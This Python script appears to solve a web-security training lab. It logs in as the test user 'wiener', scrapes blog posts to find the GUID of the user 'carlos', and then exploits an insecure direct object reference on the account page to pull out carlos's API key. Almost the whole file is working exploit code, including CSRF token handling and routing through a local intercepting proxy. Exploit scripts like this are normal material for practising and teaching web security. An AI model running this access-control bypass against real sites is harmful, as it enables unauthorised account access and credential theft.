import sys
import urllib3
import re
import requests as rs
from bs4 import BeautifulSoup as bs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'http://127.0.0.1:8080'
}



def get_csrf_token(s,url):
    r = s.get(url,verify=False,proxies=proxies)
    soup = bs(r.text,'html.parser')
    csrf = soup.find('input',{'name':'csrf'})['value']
    csrf_tokens = {'csrf':csrf}
    sys.stdout.write("[+] CSRF Token : %s\n" % csrf)
    return csrf_tokens



def carlos_guid(s,url):
    # load  home page
    r = rs.get(url,verify=False,proxies=proxies)
    resp = r.text
    post_ids = re.findall(r'postId=(\w+)"',resp)
    unique_post_IDs = list(set(post_ids))
    sys.stdout.write("[+] Carlos GUID :\n%s\n" % unique_post_IDs)
    
    # loop through each guid and check if the post belongs to carlos
    
    for i in unique_post_IDs:
        r = s.get(url + "/post?postId=%s" % i,verify=False,proxies=proxies)
        resp = r.text
        if 'carlos' in resp:
            sys.stdout.write("[+] Carlos GUID found: %s\n" % i)
            guid = re.findall(r"userId=(.*)'",resp)[0]
            return guid


def carlos_api_key(s,url):

    # get csrf token 
    login_url = url + '/login'
    csrf_token = get_csrf_token(s,login_url)
    
    # login as wiener user 
    sys.stdout.write("[+] Login as wiener user\n")
    data_login = {
        'csrf' : csrf_token['csrf'],
        'username' : 'wiener',
        'password' : 'peter'
    }

    r = s.post(login_url,data=data_login,verify=False,proxies=proxies)
    res = r.text

    if 'Log out' in res:
        sys.stdout.write("[+] Login successful\n")

        # obtain carloas guid
        guid = carlos_guid(s,url)

        # obtain api key
        carlos_account_url = url + "/my-account?id=%s" % guid
        r = s.get(carlos_account_url,verify=False,proxies=proxies)
        resp = r.text
        if 'carlos' in resp:
            sys.stdout.write("[+] Carlos account accessed\n")
            print("retrieving carlos api key")
            api_key = re.findall(r"API Key is: (.*)\<\/div>", resp)[0]
            sys.stdout.write("[+] Carlos API Key is: %s\n" % api_key)

        else:
            sys.stdout.write("[-] Carlos account not accessed\n")
            sys.exit(1)
        

    else:
        sys.stdout.write("[-] Login failed\n")
        sys.exit(1)


def main():
    if len(sys.argv) != 2:
        sys.stdout.write("Usage: python3 %s <URL>\n" % sys.argv[0])
        sys.exit(1)

    s = rs.Session()
    url = sys.argv[1]

    carlos_api_key(s,url)

if __name__ == '__main__':
    main()



